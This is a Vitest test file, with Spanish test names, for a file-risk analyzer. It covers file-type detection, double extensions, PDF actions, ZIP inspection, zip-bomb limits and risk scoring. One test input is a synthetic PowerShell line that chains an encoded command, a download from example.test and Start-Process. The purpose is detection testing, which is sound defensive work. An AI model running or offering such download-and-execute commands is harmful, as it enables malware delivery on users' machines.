import { describe, expect, it } from "vitest";
import { analyzeBytes, bytesToHex } from "./engine";
import { detectFileType, hasDoubleExtension } from "./detect";
import { riskFromScore, scoreIndicators } from "./constants";
import { readZipEntries } from "./analyzers/zip";
import { MAX_FILE_BYTES } from "./constants";
import { syntheticFixtures } from "./synthetic-fixtures";

const encoder = new TextEncoder();

describe("deteccion de archivos", () => {
  it("detecta magic bytes sin confiar en la extension", () => {
    const pe = syntheticFixtures.minimalPe;
    expect(detectFileType(pe, "foto.jpg").id).toBe("pe");
    expect(analyzeBytes(pe, { name: "foto.jpg" }).indicators.map((item) => item.id)).toContain("type-mismatch");
  });
  it("detecta PDF, PNG, scripts y archivos vacios", () => {
    expect(detectFileType(encoder.encode("%PDF-1.7"), "x.bin").id).toBe("pdf");
    expect(detectFileType(new Uint8Array([0x89, 0x50, 0x4e, 0x47, 13, 10, 26, 10]), "x").id).toBe("png");
    expect(detectFileType(encoder.encode("echo hola"), "x.ps1").id).toBe("script");
    expect(detectFileType(new Uint8Array(), "vacio").id).toBe("empty");
    expect(hasDoubleExtension("factura.pdf.exe")).toBe(true);
  });
});

describe("analizadores y puntuacion", () => {
  it("combina señales de script sin declarar malware", () => {
    const result = analyzeBytes(encoder.encode("powershell -EncodedCommand QUFBQUFB; Invoke-WebRequest https://example.test/a; Start-Process a.exe"), { name: "actualizacion.ps1" });
    expect(result.indicators.map((item) => item.id)).toEqual(expect.arrayContaining(["script-encoded-command", "script-download-execute"]));
    expect(result.riskLevel).toMatch(/Riesgo/);
  });
  it("detecta acciones PDF sinteticas", () => {
    const result = analyzeBytes(encoder.encode("%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JavaScript /JS (test) /Launch >>"), { name: "prueba.pdf" });
    expect(result.indicators.map((item) => item.id)).toEqual(expect.arrayContaining(["pdf-javascript", "pdf-auto-action", "pdf-launch"]));
  });
  it("usa pesos centralizados y rangos reproducibles", () => {
    expect(scoreIndicators([{ id: "double-extension", severity: "media" }])).toBe(18);
    expect(riskFromScore(0)).toBe("Sin indicadores evidentes");
    expect(riskFromScore(40)).toBe("Riesgo elevado");
  });
  it("convierte SHA-256 a hexadecimal", () => expect(bytesToHex(new Uint8Array([0, 15, 255]).buffer)).toBe("000fff"));
  it("rechaza ZIP corrupto de forma determinista", () => expect(readZipEntries(new Uint8Array([0x50, 0x4b, 3, 4])).truncated).toBe(true));
  it("inspecciona ZIP sin extraer y detecta ejecutables", () => {
    const result = analyzeBytes(syntheticFixtures.zipWithSyntheticExe, { name: "documentos.zip" });
    expect(result.indicators.map((item) => item.id)).toEqual(expect.arrayContaining(["archive-executable", "archive-double-extension"]));
  });
  it("aplica defensas contra declaraciones de ZIP bomb", () => {
    const result = analyzeBytes(syntheticFixtures.zipBombDeclaration, { name: "datos.zip" });
    expect(result.indicators.map((item) => item.id)).toContain("zip-bomb-ratio");
    expect(result.partial).toBe(true);
  });
  it("mantiene bajos los falsos positivos basicos", () => {
    for (const [name, bytes] of [["nota.txt", syntheticFixtures.normalTxt], ["foto.jpg", syntheticFixtures.normalJpg], ["imagen.png", syntheticFixtures.normalPng], ["normal.pdf", syntheticFixtures.normalPdf]] as const) expect(analyzeBytes(bytes, { name }).score).toBeLessThan(20);
  });
  it("documenta el limite real sin reservar memoria", () => expect(MAX_FILE_BYTES).toBe(64 * 1024 * 1024));
  it("calcula SHA-256 con Web Crypto", async () => {
    const hash = bytesToHex(await crypto.subtle.digest("SHA-256", encoder.encode("abc")));
    expect(hash).toBe("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
  });
});
